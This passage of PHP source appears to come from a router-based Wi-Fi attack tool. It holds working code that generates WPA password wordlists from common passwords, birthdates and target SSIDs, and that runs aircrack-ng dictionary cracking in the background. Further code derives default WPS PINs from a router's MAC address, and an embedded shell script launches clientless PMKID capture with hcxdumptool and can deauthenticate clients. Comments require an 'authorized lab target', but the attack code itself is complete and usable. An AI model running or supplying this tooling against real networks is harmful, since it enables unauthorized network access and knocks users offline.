            'welcome2024', 'welcome2025', 'summer2024', 'winter2024', 'spring2024', 'autumn2024',
            '10203040', '13579246', '24681357', 'a1b2c3d4', 'asdfghjkl', 'zxcvbnm123',
            '55555555', '99999999', '12121212', '77777777', 'test1234', 'demo1234',
            'qazwsxedc', '1234qwer', 'qwer1234', 'pass1234', 'secret123', 'hello123',
            'love1234', 'money123', 'happy123', 'ninja123', 'ranger123', 'hunter123',
        ];
    }

    private function digitsWordlist()
    {
        $out = [];
        for ($d = 0; $d <= 9; $d++) {
            $out[] = str_repeat((string)$d, 8);
        }
        $asc = '0123456789';
        for ($i = 0; $i + 8 <= 10; $i++) {
            $out[] = substr($asc, $i, 8);
        }
        $desc = '9876543210';
        for ($i = 0; $i + 8 <= 10; $i++) {
            $out[] = substr($desc, $i, 8);
        }
        // yyyymmdd birthdays — a realistic bounded PSK space (~19k entries).
        for ($y = 1960; $y <= 2015; $y++) {
            for ($m = 1; $m <= 12; $m++) {
                for ($day = 1; $day <= 28; $day++) {
                    $out[] = sprintf('%04d%02d%02d', $y, $m, $day);
                }
            }
        }
        return $out;
    }

    private function ssidWordlist($ssid)
    {
        $bases = array_values(array_unique([$ssid, strtolower($ssid), strtoupper($ssid), ucfirst(strtolower($ssid))]));
        $suffixes = [
            '', '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678',
            '2020', '2021', '2022', '2023', '2024', '2025', '@123', '@1234', '!', '!123',
            '#123', '00', '007', 'password', 'wifi', 'admin',
        ];
        $out = [];
        foreach ($bases as $b) {
            foreach ($suffixes as $s) {
                $out[] = $b . $s;
            }
            for ($n = 0; $n <= 999; $n++) {
                $out[] = $b . $n;
            }
        }
        return $out;
    }

    public function generateWordlist()
    {
        $type = (string)($this->request['type'] ?? 'common');
        if (!in_array($type, ['common', 'digits', 'ssid'], true)) {
            return self::setError('Unknown wordlist type.');
        }
        if (!$this->ensureDir($this->wordlistDir())) {
            return self::setError('Unable to create wordlist storage.');
        }
        if ($type === 'common') {
            $words = $this->commonPskList();
            $name = 'common-psk.txt';
        } elseif ($type === 'digits') {
            $words = $this->digitsWordlist();
            $name = 'digits-dates.txt';
        } else {
            $ssid = trim((string)($this->request['ssid'] ?? ''));
            if ($ssid === '') {
                return self::setError('Enter the target SSID to derive a wordlist.');
            }
            $words = $this->ssidWordlist($ssid);
            $slug = preg_replace('/[^A-Za-z0-9]/', '', $ssid);
            $slug = ($slug === '') ? 'derived' : substr($slug, 0, 20);
            $name = 'ssid-' . $slug . '.txt';
        }
        if (!$this->isSafeWordlistName($name)) {
            $name = 'wordlist.txt';
        }
        // WPA keys are 8-63 chars; drop anything outside that so aircrack skips nothing.
        $words = array_values(array_unique(array_filter($words, function ($w) {
            $l = strlen($w);
            return $l >= 8 && $l <= 63;
        })));
        @file_put_contents($this->wordlistDir() . '/' . $name, implode("\n", $words) . "\n");
        return self::setSuccess(['name' => $name, 'count' => count($words)]);
    }

    public function deleteWordlist()
    {
        $name = (string)($this->request['name'] ?? '');
        if (!$this->isSafeWordlistName($name)) {
            return self::setError('Invalid wordlist name.');
        }
        $path = $this->wordlistDir() . '/' . $name;
        if (!is_file($path)) {
            return self::setError('Wordlist not found.');
        }
        @unlink($path);
        return self::setSuccess(['deleted' => true, 'name' => $name]);
    }

    // Uploads arrive as base64 inside the JSON body (the Frieren API only accepts
    // application/json, and PHP here is memory_limit=8M / post_max_size=8M), so we
    // cap payloads well under those limits. Big wordlists are impractical on this
    // single-core MIPS CPU anyway — generate large lists on-device instead.
    const UPLOAD_MAX_BYTES = 1887436; // ~1.8 MiB decoded

    private function decodeUploadPayload()
    {
        $b64 = (string)($this->request['contentB64'] ?? '');
        // Free the large request copy as early as possible on this tiny-RAM box.
        unset($this->request['contentB64']);
        // Tolerate a data: URL prefix the browser's FileReader may prepend.
        if (($p = strpos($b64, 'base64,')) !== false) {
            $b64 = substr($b64, $p + 7);
        }
        $b64 = preg_replace('/\s+/', '', $b64);
        if ($b64 === '') {
            return ['err' => 'No file content was received.'];
        }
        if (strlen($b64) > (int)(self::UPLOAD_MAX_BYTES * 4 / 3) + 256) {
            return ['err' => 'File is too large (max ' . round(self::UPLOAD_MAX_BYTES / 1048576, 1) . ' MB on this hardware).'];
        }
        $data = base64_decode($b64, true);
        if ($data === false) {
            return ['err' => 'File content was not valid base64.'];
        }
        if (strlen($data) === 0) {
            return ['err' => 'The uploaded file is empty.'];
        }
        if (strlen($data) > self::UPLOAD_MAX_BYTES) {
            return ['err' => 'File is too large (max ' . round(self::UPLOAD_MAX_BYTES / 1048576, 1) . ' MB on this hardware).'];
        }
        return ['data' => $data];
    }

    public function uploadWordlist()
    {
        if (!$this->ensureDir($this->wordlistDir())) {
            return self::setError('Unable to access wordlist storage.');
        }
        $name = trim((string)($this->request['name'] ?? ''));
        $name = preg_replace('/[^A-Za-z0-9._-]/', '_', basename($name));
        if ($name === '' || $name === '.' || $name === '..') {
            $name = 'custom.txt';
        }
        if (!preg_match('/\.txt$/i', $name)) {
            $name .= '.txt';
        }
        $name = substr($name, -64);
        if (!$this->isSafeWordlistName($name)) {
            return self::setError('Invalid wordlist name.');
        }
        $payload = $this->decodeUploadPayload();
        if (isset($payload['err'])) {
            return self::setError($payload['err']);
        }
        // Write raw, then filter to WPA-valid lengths via awk (keeps PHP memory low
        // — no big in-PHP arrays). aircrack would skip <8 or >63 char lines anyway.
        $path = $this->wordlistDir() . '/' . $name;
        $tmp = $path . '.raw';
        if (@file_put_contents($tmp, $payload['data']) === false) {
            return self::setError('Unable to save the wordlist.');
        }
        unset($payload);
        shell_exec("awk '{ sub(/\\r$/, \"\"); if (length(\$0) >= 8 && length(\$0) <= 63) print }' "
            . escapeshellarg($tmp) . ' > ' . escapeshellarg($path) . ' 2>/dev/null');
        @unlink($tmp);
        if (!is_file($path) || filesize($path) === 0) {
            @unlink($path);
            return self::setError('No usable passphrases in the file (WPA keys are 8–63 characters).');
        }
        $count = (int)trim((string)shell_exec('wc -l < ' . escapeshellarg($path) . ' 2>/dev/null'));
        return self::setSuccess(['name' => $name, 'count' => $count, 'bytes' => (int)filesize($path)]);
    }

    public function uploadCapture()
    {
        if (!$this->ensureCaptureJobStorage()) {
            return self::setError('Unable to access capture storage.');
        }
        $payload = $this->decodeUploadPayload();
        if (isset($payload['err'])) {
            return self::setError($payload['err']);
        }
        $data = $payload['data'];
        unset($payload);

        // Validate by file magic: classic pcap (LE/BE, us/ns) or pcapng.
        $magic4 = substr($data, 0, 4);
        $isPcap = in_array($magic4, ["\xd4\xc3\xb2\xa1", "\xa1\xb2\xc3\xd4", "\x4d\x3c\xb2\xa1", "\xa1\xb2\x3c\x4d"], true);
        $isPcapng = ($magic4 === "\x0a\x0d\x0d\x0a");
        if (!$isPcap && !$isPcapng) {
            return self::setError('Not a pcap/pcapng capture. Upload a .cap/.pcap/.pcapng containing a WPA handshake or PMKID.');
        }

        $jobId = 'upload-' . gmdate('YmdHis') . '-' . mt_rand(1000, 9999);
        $paths = $this->captureJobPaths($jobId);
        $srcTmp = $this->captureJobDir() . '/' . $jobId . '.src';
        if (@file_put_contents($srcTmp, $data) === false) {
            return self::setError('Unable to stage the uploaded capture.');
        }
        unset($data);

        // aircrack reads classic pcap; convert pcapng with tcpdump. Keep the
        // original for hcxpcapngtool (it reads both and finds handshakes/PMKID).
        if ($isPcapng) {
            shell_exec('tcpdump -r ' . escapeshellarg($srcTmp) . ' -w ' . escapeshellarg($paths['cap']) . ' >/dev/null 2>&1');
        } else {
            @copy($srcTmp, $paths['cap']);
        }
        shell_exec('hcxpcapngtool -o ' . escapeshellarg($paths['hash']) . ' ' . escapeshellarg($srcTmp)
            . ' >> ' . escapeshellarg($paths['out']) . ' 2>&1');
        @unlink($srcTmp);

        if (!is_file($paths['cap']) || filesize($paths['cap']) === 0) {
            foreach ($paths as $p) { @unlink($p); }
            return self::setError('Could not read the capture (conversion failed).');
        }

        // Learn BSSID/ESSID from the hashcat 22000 line: WPA*type*mic*MAC_AP*MAC_STA*ESSID*...
        $bssid = strtolower(preg_replace('/[^0-9a-f]/', '', strtolower((string)($this->request['bssid'] ?? ''))));
        $ssid = '';
        if (is_file($paths['hash']) && filesize($paths['hash']) > 0) {
            $firstLine = trim((string)shell_exec('head -n1 ' . escapeshellarg($paths['hash']) . ' 2>/dev/null'));
            $f = explode('*', $firstLine);
            if (count($f) >= 6) {
                if ($bssid === '' && preg_match('/^[0-9a-f]{12}$/', $f[3])) {
                    $bssid = $f[3];
                }
                $hexEssid = $f[5];
                if ($hexEssid !== '' && preg_match('/^[0-9a-fA-F]+$/', $hexEssid) && strlen($hexEssid) % 2 === 0) {
                    $ssid = (string)@hex2bin($hexEssid);
                }
            }
        }
        if (strlen($bssid) === 12) {
            $bssid = implode(':', str_split($bssid, 2));
        }
        $ssid = $this->cleanSsid($ssid !== '' ? $ssid : (string)($this->request['ssid'] ?? ''));

        if (!$this->isSafeBssid($bssid)) {
            foreach ($paths as $p) { @unlink($p); }
            return self::setError('No BSSID found in the capture. Re-upload and provide the target BSSID (aa:bb:cc:dd:ee:ff).');
        }

        $result = $this->summarizeCaptureResult($paths);
        $meta = [
            'jobId' => $jobId,
            'type' => 'upload',
            'target' => ['bssid' => $bssid, 'ssid' => $ssid],
            'source' => 'uploaded',
            'origName' => substr(preg_replace('/[^A-Za-z0-9._-]/', '_', basename((string)($this->request['name'] ?? 'upload.cap'))), -64),
            'createdAt' => gmdate('c'),
        ];
        @file_put_contents($paths['meta'], json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
        // An upload finishes synchronously in this request — unlike a live capture
        // there is no background job to mark it done. Without this, captureStatus/
        // getCaptureHistory read "no done file" as "still running" forever, and
        // deleteCapture refuses to remove anything that looks like it's running.
        @file_put_contents($paths['done'], '0');

        return self::setSuccess([
            'jobId' => $jobId,
            'bssid' => $bssid,
            'ssid' => $ssid,
            'handshake' => !empty($result['handshakeCaptured']),
            'hashCount' => $result['hashCount'] ?? 0,
        ]);
    }

    public function deleteCrackSource()
    {
        $jobId = (string)($this->request['jobId'] ?? '');
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid capture.');
        }
        $paths = $this->captureJobPaths($jobId);
        if (!is_file($paths['meta']) && !is_file($paths['cap'])) {
            return self::setError('Capture was not found.');
        }
        foreach ($paths as $p) {
            @unlink($p);
        }
        return self::setSuccess(['deleted' => true, 'jobId' => $jobId]);
    }

    public function startCrack()
    {
        if (trim((string)shell_exec('command -v aircrack-ng 2>/dev/null')) === '') {
            return self::setError("Required tool 'aircrack-ng' is not installed.");
        }
        if ($this->isCrackRunning()) {
            return self::setError('A crack job is already running. Stop it first.');
        }
        $captureId = (string)($this->request['captureId'] ?? '');
        if (!$this->isSafeJobId($captureId)) {
            return self::setError('Invalid capture selection.');
        }
        $wordlist = (string)($this->request['wordlist'] ?? '');
        if (!$this->isSafeWordlistName($wordlist)) {
            return self::setError('Invalid wordlist selection.');
        }
        $wlPath = $this->wordlistDir() . '/' . $wordlist;
        if (!is_file($wlPath) || filesize($wlPath) === 0) {
            return self::setError('Wordlist not found. Generate one first.');
        }
        $capPaths = $this->captureJobPaths($captureId);
        if (!is_file($capPaths['cap']) || filesize($capPaths['cap']) === 0) {
            return self::setError('The selected capture has no pcap to crack.');
        }
        $capMeta = json_decode((string)@file_get_contents($capPaths['meta']), true);
        $capMeta = is_array($capMeta) ? $capMeta : [];
        $bssid = strtolower((string)($capMeta['target']['bssid'] ?? ''));
        if (!$this->isSafeBssid($bssid)) {
            return self::setError('The capture has no valid target BSSID.');
        }
        if (!$this->ensureDir($this->crackJobDir())) {
            return self::setError('Unable to create crack job storage.');
        }

        $jobId = 'crack-' . gmdate('YmdHis') . '-' . mt_rand(1000, 9999);
        $paths = $this->crackJobPaths($jobId);
        $wlLines = (int)trim((string)shell_exec('wc -l < ' . escapeshellarg($wlPath) . ' 2>/dev/null'));
        $meta = [
            'jobId' => $jobId,
            'captureId' => $captureId,
            'bssid' => $bssid,
            'ssid' => $capMeta['target']['ssid'] ?? '',
            'wordlist' => $wordlist,
            'wordlistLines' => $wlLines,
            'engine' => 'aircrack-ng -a2 dictionary',
            'createdAt' => gmdate('c'),
        ];
        @file_put_contents($paths['meta'], json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        $aircrack = trim((string)shell_exec('command -v aircrack-ng 2>/dev/null')) ?: 'aircrack-ng';
        $eWl = escapeshellarg($wlPath);
        $eBssid = escapeshellarg($bssid);
        $eKey = escapeshellarg($paths['key']);
        $eCap = escapeshellarg($capPaths['cap']);
        $eOut = escapeshellarg($paths['out']);
        $eDone = escapeshellarg($paths['done']);
        $ePid = escapeshellarg($paths['pid']);
        $eStop = escapeshellarg($paths['stop']);

        $body = escapeshellarg($aircrack) . ' -a2 -w ' . $eWl . ' -b ' . $eBssid . ' -l ' . $eKey . ' ' . $eCap . ' >> ' . $eOut . ' 2>&1 & APID=$!; '
            . 'echo $APID > ' . $ePid . '; '
            . 'while kill -0 $APID 2>/dev/null; do if [ -f ' . $eStop . ' ]; then kill $APID 2>/dev/null; sleep 1; kill -9 $APID 2>/dev/null; break; fi; sleep 2; done; '
            . 'wait $APID 2>/dev/null; echo 0 > ' . $eDone . ';';
        shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $body . ' ) >/dev/null 2>&1 &'));

        return self::setSuccess(['pending' => true, 'jobId' => $jobId, 'meta' => $meta]);
    }

    public function crackStatus()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid crack job.');
        }
        $paths = $this->crackJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Crack job was not found.');
        }
        $meta = json_decode((string)@file_get_contents($paths['meta']), true);
        $meta = is_array($meta) ? $meta : [];
        $pending = !is_file($paths['done']);

        $out = $this->tailFile($paths['out'], 8000);
        $clean = preg_replace('/\x1b\[[0-9;?]*[A-Za-z]/', '', $out);
        $clean = str_replace("\r", "\n", $clean);

        $found = '';
        if (is_file($paths['key']) && filesize($paths['key']) > 0) {
            $found = trim((string)@file_get_contents($paths['key']));
        }
        if ($found === '' && preg_match('/KEY FOUND!\s*\[\s*(.+?)\s*\]/', $clean, $km)) {
            $found = trim($km[1]);
        }

        $tested = 0;
        $total = (int)($meta['wordlistLines'] ?? 0);
        $speed = 0.0;
        if (preg_match_all('/([\d,]+)\/([\d,]+)\s+keys tested[^(]*\(\s*([\d.]+)\s*k\/s\)/', $clean, $pm, PREG_SET_ORDER)) {
            $last = end($pm);
            $tested = (int)str_replace(',', '', $last[1]);
            $total = (int)str_replace(',', '', $last[2]);
            $speed = (float)$last[3];
        }
        $current = '';
        if (preg_match_all('/Current passphrase:\s*(\S.*?)\s*$/m', $clean, $cm) && !empty($cm[1])) {
            $current = trim(end($cm[1]));
        }
        $noHandshake = (bool)preg_match('/no valid WPA handshakes|contained no EAPOL data|No matching network/i', $clean);

        return self::setSuccess([
            'pending' => $pending,
            'jobId' => $jobId,
            'meta' => $meta,
            'found' => $found,
            'cracked' => $found !== '',
            'tested' => $tested,
            'total' => $total,
            'speed' => $speed,
            'current' => $current,
            'noHandshake' => $noHandshake && !$pending,
            'log' => $clean,
        ]);
    }

    public function stopCrack()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid crack job.');
        }
        $paths = $this->crackJobPaths($jobId);
        if (is_file($paths['meta'])) {
            @file_put_contents($paths['stop'], gmdate('c'));
        }
        return self::setSuccess(['stopping' => true, 'jobId' => $jobId]);
    }

    // --- WPS default-PIN intelligence (pure PHP, no external tools) ---

    private function macToFloat($bssid)
    {
        $hex = str_replace(':', '', strtolower($bssid));
        $val = 0.0;
        for ($i = 0; $i < strlen($hex); $i++) {
            $val = $val * 16 + hexdec($hex[$i]);
        }
        return $val;
    }

    private function wpsChecksum($pin)
    {
        $accum = 0;
        $t = (int)$pin;
        while ($t) {
            $accum += 3 * ($t % 10);
            $t = intdiv($t, 10);
            $accum += $t % 10;
            $t = intdiv($t, 10);
        }
        return (10 - $accum % 10) % 10;
    }

    // Classic ComputePIN: 7-digit seed -> append the WPS checksum digit.
    // fmod keeps the math exact on the router's 32-bit PHP (48-bit MAC > 2^31).
    private function wpsGenPin($seedFloat)
    {
        $pin = (int)fmod($seedFloat, 10000000.0);
        $pin = $pin * 10 + $this->wpsChecksum($pin);
        return str_pad((string)$pin, 8, '0', STR_PAD_LEFT);
    }

    private function wpsPinCandidates($bssid)
    {
        $mac = $this->macToFloat($bssid);
        $out = [];
        $add = function ($algo, $pin) use (&$out) {
            $out[] = ['algo' => $algo, 'pin' => $pin];
        };

        // ComputePIN family — seed = the low N bits of the MAC.
        $masks = [
            24 => 16777216.0, 28 => 268435456.0, 32 => 4294967296.0,
            36 => 68719476736.0, 40 => 1099511627776.0, 44 => 17592186044416.0,
            48 => 281474976710656.0,
        ];
        foreach ($masks as $bits => $mod) {
            $add('ComputePIN-' . $bits, $this->wpsGenPin(fmod($mac, $mod)));
        }

        // D-Link default algorithm (derived from the low 24 bits / NIC).
        $nic = (int)fmod($mac, 16777216.0);
        foreach ([0, 1] as $delta) {
            $n = $nic + $delta;
            $pin = $n ^ 0x55AA55;
            $pin ^= ((($pin & 0xF) << 4) + (($pin & 0xF) << 8) + (($pin & 0xF) << 12) + (($pin & 0xF) << 16) + (($pin & 0xF) << 20));
            $pin = $pin % 10000000;
            if ($pin < 1000000) {
                $pin += (($pin % 9) * 1000000) + 1000000;
            }
            $add('D-Link' . ($delta ? '+1' : ''), str_pad((string)($pin * 10 + $this->wpsChecksum($pin)), 8, '0', STR_PAD_LEFT));
        }

        // Well-known static defaults.
        $add('Static default', '12345670');
        $add('Static default', '00000000');

        $seen = [];
        $res = [];
        foreach ($out as $c) {
            if (isset($seen[$c['pin']])) {
                continue;
            }
            $seen[$c['pin']] = true;
            $res[] = $c;
        }
        return $res;
    }

    public function computeWpsPins()
    {
        $bssid = strtolower(trim((string)($this->request['bssid'] ?? '')));
        if (!$this->isSafeBssid($bssid)) {
            return self::setError('Enter a valid BSSID (aa:bb:cc:dd:ee:ff).');
        }
        return self::setSuccess([
            'bssid' => $bssid,
            'pins' => $this->wpsPinCandidates($bssid),
        ]);
    }

    // ---- Suite: Clientless Assault ------------------------------------------------
    // True clientless PMKID capture on 2.4 GHz (ath9k) via hcxdumptool, scoped to the
    // single authorized target by a compiled Berkeley Packet Filter (BPF). The BPF is
    // the linchpin: it restricts every transmit/attack AND capture to the one target
    // BSSID, which both keeps neighbours untouched and stops the active injection from
    // fanning out across every AP in range — an unscoped hcxdumptool run is what once
    // wedged this radio into a watchdog reboot (2026-07-09). hcxdumptool is given a
    // CLEAN, dedicated netifd monitor interface (it must own the radio alone; a
    // parallel AP/STA makes it "fail to arm the interface"), sets monitor mode itself
    // (never a hand-made `iw` virtual vif — the tool explicitly forbids that), and the
    // radio is fully restored afterwards. Validated end-to-end on this hardware: the
    // tool arms the interface, runs, BPF-scopes correctly, and the box stays up.
    //   5 GHz (ath10k) cannot inject in monitor mode, so a 5 GHz target still falls
    // back to the passive aircrack-ng capture engine (needs a client to reassociate).

    private function isClientlessRunning()
    {
        return trim((string)shell_exec('/usr/bin/pgrep -x hcxdumptool 2>/dev/null')) !== '';
    }

    private function isUplinkActive()
    {
        // The 5GHz radio doubles as the internet uplink STA. If phy0-sta0 is
        // associated, a monitor capture on 5GHz would drop internet with no restore,
        // so 5GHz capture is only allowed once the uplink has been freed (Lab mode).
        $out = (string)shell_exec('iw dev phy0-sta0 link 2>/dev/null');
        return stripos($out, 'Connected to') !== false;
    }

    public function startClientless()
    {
        $bssid = strtolower(trim((string)($this->request['bssid'] ?? '')));
        $ssid = $this->cleanSsid((string)($this->request['ssid'] ?? ''));
        $duration = (int)($this->request['duration'] ?? 60);
        $mode = (($this->request['mode'] ?? 'pmkid') === 'full') ? 'full' : 'pmkid';

        if (!$this->isSafeBssid($bssid)) {
            return self::setError('Invalid target BSSID.');
        }
        if ($duration < 15 || $duration > 180) {
            return self::setError('Duration must be between 15 and 180 seconds.');
        }
        if (empty($this->request['authorized'])) {
            return self::setError('Target must be marked as an authorized lab target before a clientless attack.');
        }
        if ($this->isCaptureRunning() || $this->isClientlessRunning() || $this->isEvilPortalRunning()) {
            return self::setError('Another radio job (capture / clientless / portal) is running. Stop it first.');
        }

        $channel = (int)($this->request['channel'] ?? 0);
        if ($channel < 1 || $channel > 196) {
            return self::setError('Target channel is unknown. Re-scan the target before a clientless attack.');
        }
        // Same live-channel refresh as startCapture: APs with auto/DFS channels drift.
        $liveChannel = $this->refreshTargetChannel($bssid, $channel <= 14 ? '2g' : '5g');
        if ($liveChannel !== null) {
            $channel = $liveChannel;
        }

        $monitor = $this->resolveMonitorTarget($channel);
        if ($monitor === null) {
            return self::setError('Could not find a radio that supports the target channel.');
        }

        $target = [
            'bssid' => $bssid,
            'ssid' => $ssid,
            'security' => trim((string)($this->request['security'] ?? '')),
            'channel' => (string)$channel,
            'frequency' => '',
            'metadata' => ['label' => $ssid, 'authorized' => true],
        ];

        // 2.4 GHz → true clientless PMKID via hcxdumptool (BPF-scoped, validated safe).
        if ($channel <= 14) {
            foreach (['hcxdumptool', 'hcxpcapngtool'] as $tool) {
                if (trim((string)shell_exec('command -v ' . escapeshellarg($tool) . ' 2>/dev/null')) === '') {
                    return self::setError("Required tool '{$tool}' is not installed.");
                }
            }
            return $this->startHcxClientlessJob($target, $channel, $monitor, $duration, $mode);
        }

        // 5 GHz → passive aircrack fallback (ath10k can't inject in monitor mode).
        foreach (['airodump-ng', 'aireplay-ng', 'hcxpcapngtool'] as $tool) {
            if (trim((string)shell_exec('command -v ' . escapeshellarg($tool) . ' 2>/dev/null')) === '') {
                return self::setError("Required tool '{$tool}' is not installed.");
            }
        }
        if ($this->isUplinkActive()) {
            return self::setError('5 GHz capture needs the 5 GHz radio, which is currently your internet uplink. Open Radio Control and switch to Lab mode first (this drops internet), run the capture, then switch back to Uplink mode.');
        }
        $deauth = ($mode === 'full');
        return $this->startCaptureJob($target, $channel, $monitor, '', $duration, $deauth, 3, 12, 0);
    }

    private function startHcxClientlessJob($target, $channel, $monitor, $duration, $mode)
    {
        if (!$this->ensureCaptureJobStorage()) {
            return self::setError('Unable to create capture job storage.');
        }

        $jobId = 'clientless-' . gmdate('YmdHis') . '-' . mt_rand(1000, 9999);
        $paths = $this->captureJobPaths($jobId);
        $bssid = strtolower($target['bssid']);
        $bssidHex = str_replace(':', '', $bssid);
        $radio = $monitor['radio'];
        $ch = (int)$channel;
        $dur = (int)$duration;

        $meta = [
            'jobId' => $jobId,
            'engine' => 'hcxdumptool (clientless PMKID/EAPOL, BPF-scoped to target)',
            'mode' => $mode,
            'target' => [
                'bssid' => $bssid,
                'ssid' => $target['ssid'] ?? '',
                'channel' => (string)$ch,
                'frequency' => '',
                'security' => $target['security'] ?? '',
                'label' => $target['ssid'] ?? '',
            ],
            'duration' => $dur,
            'radio' => $radio,
            'phy' => $monitor['phy'],
            'band' => $monitor['band'],
            'createdAt' => gmdate('c'),
            'warning' => "Clientless PMKID briefly puts radio {$radio} into monitor mode (disabling its other Wi-Fi interfaces for the run, then restoring them). Every frame is scoped to the one authorized BSSID by a compiled BPF filter.",
        ];
        @file_put_contents($paths['meta'], json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        $hcx = trim((string)shell_exec('command -v hcxdumptool 2>/dev/null')) ?: 'hcxdumptool';
        $hcxtool = trim((string)shell_exec('command -v hcxpcapngtool 2>/dev/null')) ?: 'hcxpcapngtool';
        $tcpdump = trim((string)shell_exec('command -v tcpdump 2>/dev/null')) ?: 'tcpdump';
        $base = $this->captureJobDir() . '/' . $jobId;

        // pmkid = gentle clientless: solicit the AP's PMKID (association) but never
        // deauth its clients (--attemptclientmax=0). full = also allow the client-side
        // EAPOL attack (default deauth) for a 4-way handshake. Both stay BPF-scoped.
        $modeFlags = ($mode === 'pmkid') ? '--attemptclientmax=0' : '';

        // Config values are injected as shell variables at the top (each escapeshellarg'd),
        // then the logic runs as a literal here-doc — this keeps shell/PHP escaping from
        // fighting over the sed/awk/uci one-liners.
        $header = "#!/bin/sh\n"
            . 'HCX=' . escapeshellarg($hcx) . "\n"
            . 'HCXTOOL=' . escapeshellarg($hcxtool) . "\n"
            . 'TCPDUMP=' . escapeshellarg($tcpdump) . "\n"
            . 'RADIO=' . escapeshellarg($radio) . "\n"
            . 'CH=' . (int)$ch . "\n"
            . 'DUR=' . (int)$dur . "\n"
            . 'BSSIDHEX=' . escapeshellarg($bssidHex) . "\n"
            . 'MODEFLAGS=' . escapeshellarg($modeFlags) . "\n"
            . 'PCAPNG=' . escapeshellarg($base . '.pcapng') . "\n"
            . 'BPF=' . escapeshellarg($base . '.bpf') . "\n"
            . 'CAP=' . escapeshellarg($paths['cap']) . "\n"
            . 'HASH=' . escapeshellarg($paths['hash']) . "\n"
            . 'OUT=' . escapeshellarg($paths['out']) . "\n"
            . 'ERR=' . escapeshellarg($paths['err']) . "\n"
            . 'DONE=' . escapeshellarg($paths['done']) . "\n"
            . 'PIDF=' . escapeshellarg($paths['pid']) . "\n"
            . 'STOP=' . escapeshellarg($paths['stop']) . "\n";

        $body = <<<'SHELL'
uci -q delete wireless.wa_hcxmon
SAVED=""
for s in $(uci show wireless 2>/dev/null | sed -n 's/^wireless\.\([A-Za-z0-9_]*\)=wifi-iface$/\1/p'); do
  dev=$(uci -q get wireless.$s.device)
  [ "$dev" = "$RADIO" ] || continue
  d=$(uci -q get wireless.$s.disabled)
  if [ "$d" != "1" ]; then SAVED="$SAVED $s"; uci set wireless.$s.disabled=1; fi
done
ORIG_RD=$(uci -q get wireless.$RADIO.disabled)
uci set wireless.wa_hcxmon=wifi-iface
uci set wireless.wa_hcxmon.device="$RADIO"
uci set wireless.wa_hcxmon.mode=monitor
uci set wireless.wa_hcxmon.disabled=0
uci set wireless.$RADIO.disabled=0
uci commit wireless
/sbin/wifi up "$RADIO" >/dev/null 2>&1
sleep 6
restore() {
  uci -q delete wireless.wa_hcxmon
  for s in $SAVED; do uci set wireless.$s.disabled=0; done
  uci set wireless.$RADIO.disabled="${ORIG_RD:-1}"
  uci commit wireless
  if [ "${ORIG_RD:-1}" = "0" ]; then /sbin/wifi up "$RADIO" >/dev/null 2>&1; else /sbin/wifi down "$RADIO" >/dev/null 2>&1; fi
}
MON=$(iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i; exit}')
if [ -z "$MON" ]; then
  echo "[wa] could not bring up a monitor interface on $RADIO" >> "$ERR"
  restore
  echo 1 > "$DONE"
  exit 1
fi
echo "[wa] monitor interface $MON up on $RADIO, channel ${CH} (2.4GHz)" >> "$OUT"
"$HCX" --bpfc="wlan addr3 $BSSIDHEX" > "$BPF" 2>> "$ERR"
echo "[wa] BPF compiled for target, starting scoped clientless attack" >> "$OUT"
"$HCX" -i "$MON" -w "$PCAPNG" --bpf="$BPF" -c "${CH}a" $MODEFLAGS >> "$OUT" 2>> "$ERR" &
HPID=$!
echo $HPID > "$PIDF"
END=$(( $(date +%s) + DUR ))
while [ $(date +%s) -lt $END ]; do
  if [ -f "$STOP" ]; then echo "[wa] stop requested" >> "$OUT"; break; fi
  sleep 2
done
kill -INT $HPID 2>/dev/null; sleep 2; kill -INT $HPID 2>/dev/null; sleep 1; kill -9 $HPID 2>/dev/null
if [ -s "$PCAPNG" ]; then
  echo "[wa] converting pcapng -> 22000 hash + cap" >> "$OUT"
  "$HCXTOOL" -o "$HASH" --all "$PCAPNG" >> "$OUT" 2>> "$ERR"
  "$TCPDUMP" -r "$PCAPNG" -w "$CAP" >> "$OUT" 2>> "$ERR"
else
  echo "[wa] no pcapng was produced (target not in range, or no matching frames)" >> "$ERR"
fi
restore
echo "[wa] radio $RADIO restored" >> "$OUT"
echo 0 > "$DONE"
SHELL;

        $scriptPath = $base . '.sh';
        @file_put_contents($scriptPath, $header . $body . "\n");
        $backgroundCommand = '/bin/sh ' . escapeshellarg($scriptPath) . ' >/dev/null 2>&1 &';
        shell_exec('/bin/sh -c ' . escapeshellarg($backgroundCommand));

        return self::setSuccess(['pending' => true, 'jobId' => $jobId, 'meta' => $meta]);
    }

    public function clientlessStatus()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid clientless job.');
        }
        $paths = $this->captureJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Clientless job was not found.');
        }

        $meta = json_decode((string)@file_get_contents($paths['meta']), true);
        $meta = is_array($meta) ? $meta : [];
        $pending = !is_file($paths['done']);
        $result = $this->summarizeCaptureResult($paths);
        $out = $this->tailFile($paths['out'], 6000);
        $errText = trim($this->tailFile($paths['err'], 4000));

        // Final authoritative counts come from the hcxpcapngtool summary in the log.
        $pmkid = 0;
        $eapol = 0;
        if (preg_match('/PMKID\(s\)[^\d\n]*(\d+)/i', $out, $m)) {
            $pmkid = (int)$m[1];
        }
        if (preg_match('/EAPOL pairs[^\d\n]*(\d+)/i', $out, $m2)) {
            $eapol = (int)$m2[1];
        }

        $hashline = '';
        if (is_file($paths['hash'])) {
            $hl = file($paths['hash'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if (is_array($hl) && count($hl) > 0) {
                $hashline = $hl[0];
            }
        }

        return self::setSuccess([
            'pending' => $pending,
            'jobId' => $jobId,
            'meta' => $meta,
            'result' => $result,
            'counts' => ['pmkid' => $pmkid, 'eapol' => $eapol],
            'hashline' => $hashline,
            'log' => $out,
            'error' => $errText,
